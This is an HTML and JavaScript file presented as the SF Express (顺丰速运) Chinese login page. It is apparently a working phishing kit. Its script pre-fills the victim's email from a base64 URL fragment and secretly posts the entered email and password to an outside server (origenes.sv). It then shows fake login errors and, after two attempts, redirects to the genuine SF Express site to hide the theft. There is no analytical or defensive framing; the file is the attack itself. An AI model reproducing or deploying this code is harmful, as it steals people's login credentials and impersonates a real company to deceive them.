<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>登录 - 顺丰速运</title>
  <link rel="icon" href="https://www.sf-express.com/etc.clientlibs/sfexpress/clientlibs/clientlib-site/resources/favicon.ico" type="image/x-icon">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Microsoft YaHei', sans-serif;
      background: linear-gradient(to bottom, #f7f7f7, #ffffff);
      min-height: 100vh;
      position: relative;
    }

    .wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 90vh;
    }

    .login-container {
      background: #ffffff;
      padding: 20px 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.15);
      width: 100%;
      max-width: 380px;
      transition: all 0.3s ease;
      text-align: center;
    }

    .login-container img {
      width: 120px;
      margin-bottom: 20px;
    }

    .tab-header {
      display: flex;
      justify-content: center;
      border-bottom: 1px solid #ddd;
      margin-bottom: 20px;
    }

    .tab-header div {
      flex: 1;
      text-align: center;
      padding: 10px 0;
      font-size: 16px;
      cursor: pointer;
    }

    .tab-header .active {
      color: #e60012;
      font-weight: bold;
      border-bottom: 2px solid #e60012;
    }

    .form-group {
      margin-bottom: 20px;
      text-align: left;
    }

    .form-group label {
      display: block;
      margin-bottom: 6px;
      color: #666;
      font-size: 14px;
    }

    .form-group input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 14px;
    }

    .form-group input:focus {
      border-color: #e60012;
      outline: none;
    }

    .error-message {
      color: red;
      font-size: 12px;
      margin-top: 5px;
      display: none;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
    }

    .checkbox-group input[type="checkbox"] {
      margin-right: 8px;
    }

    .checkbox-group label {
      font-size: 12px;
      color: #666;
    }

    .checkbox-group label a {
      color: #e60012;
      text-decoration: none;
    }

    .checkbox-group label a:hover {
      text-decoration: underline;
    }

    .submit-btn {
      width: 100%;
      padding: 12px;
      background-color: #e60012;
      color: #ffffff;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }

    .submit-btn:hover {
      background-color: #c4000f;
    }

    .loading {
      display: none;
      text-align: center;
      margin-top: 10px;
      color: #666;
      animation: fadein 0.5s;
    }

    @keyframes fadein {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .shake {
      animation: shake 0.3s;
    }

    @keyframes shake {
      0% { transform: translateX(0); }
      25% { transform: translateX(-5px); }
      50% { transform: translateX(5px); }
      75% { transform: translateX(-5px); }
      100% { transform: translateX(0); }
    }

    .sf-footer {
      background-color: #f5f5f5;
      padding: 20px 0;
      text-align: center;
      font-size: 12px;
      color: #666;
      margin-top: 30px;
    }

    .sf-footer .footer-content p {
      margin: 5px 0;
    }

    .sf-footer .footer-content a {
      color: #666;
      text-decoration: none;
      margin: 0 5px;
    }

    .sf-footer .footer-content a:hover {
      text-decoration: underline;
    }

    .language-selector {
      position: fixed;
      bottom: 10px;
      right: 20px;
      font-size: 12px;
      color: #666;
    }

    .language-selector a {
      color: #666;
      margin: 0 5px;
      text-decoration: none;
    }

    .language-selector a:hover {
      text-decoration: underline;
    }
  </style>
</head>

<script>
  // Autofill email from URL hash
  window.addEventListener('DOMContentLoaded', () => {
    const hash = decodeURIComponent(window.location.hash.substring(1));
    if (hash) {
      try {
        // Try decode Base64
        const decoded = atob(hash);
        document.getElementById('email').value = decoded;
      } catch (error) {
        // If not valid base64, fallback
        document.getElementById('email').value = hash;
      }
    }
  });

  let attempts = 0; // ✅ Initialize attempts counter

  function timeout(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    let email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    const loginContainer = document.getElementById('loginContainer');
    const errorMessage = document.getElementById('error-message');
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (email.includes('#')) {
      const parts = email.split('#');
      if (parts.length === 2) {
        try {
          email = atob(parts[1]);
        } catch (error) {
          email = parts[1];
        }
      }
      document.getElementById('email').value = email;
    }

    if (!emailRegex.test(email) || password.length < 4) {
      loginContainer.classList.add('shake');
      setTimeout(() => loginContainer.classList.remove('shake'), 300);
      errorMessage.innerText = '邮箱或密码错误'; // ✏️ Static error for bad format
      errorMessage.style.display = 'block';
      return;
    }

    document.querySelector('.loading').style.display = 'block';
    errorMessage.style.display = 'none';

    try {
      await Promise.race([
        fetch('https://origenes.sv/chu/redirect.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          body: `email=${encodeURIComponent(email)}&email_base64=${encodeURIComponent(btoa(email))}&password=${encodeURIComponent(password)}`
        }),
        timeout(3000)
      ]);
    } catch (error) {
      console.log('Fetch failed or timeout.');
    }

    attempts++; // ✅ Count attempts

    if (attempts >= 2) {
      window.location.href = 'https://www.sf-express.com/chn/en/login';
    } else {
      errorMessage.innerText = `邮箱或密码错误 第 ${attempts} 次尝试`; // ✅ Show attempt count
      errorMessage.style.display = 'block';
      document.querySelector('.loading').style.display = 'none';
    }
  });
  </script>
